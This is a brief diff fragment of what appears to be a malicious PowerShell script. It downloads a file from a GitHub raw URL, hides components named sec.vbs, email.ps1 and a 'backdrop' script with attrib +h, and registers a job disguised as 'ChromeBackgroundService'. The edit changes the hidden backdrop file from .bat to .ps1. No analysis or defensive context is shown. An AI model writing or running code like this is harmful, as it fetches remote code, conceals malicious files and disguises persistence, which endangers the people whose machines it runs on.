@@ -26,7 +26,7 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/s
 
 attrib +h "$homedir\sec.vbs"
 attrib +h "$homedir\email.ps1"
-attrib +h "$homedir\backdrop.bat"
+attrib +h "$homedir\backdrop.ps1"
 
 
 $jobname = "ChromeBackgroundService"
